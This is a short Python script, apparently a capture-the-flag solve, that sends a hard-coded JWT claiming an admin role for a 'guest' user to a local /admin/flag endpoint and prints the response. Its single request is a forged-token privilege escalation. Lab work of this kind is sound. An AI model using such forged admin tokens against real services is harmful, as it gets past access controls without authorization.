import requests, subprocess

# generate token (or read from token.txt)
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4iLCJpc3MiOiJhdXRoLXNlcnZpY2UiLCJleHAiOjE5OTk5OTk5OTl9.qHQQC-u-Z0ysg49q9dZkYj6xMWppIWQIeYjVBrFNmic"

r = requests.get('http://localhost:5000/admin/flag', headers={'Authorization': token})
print(r.status_code, r.text)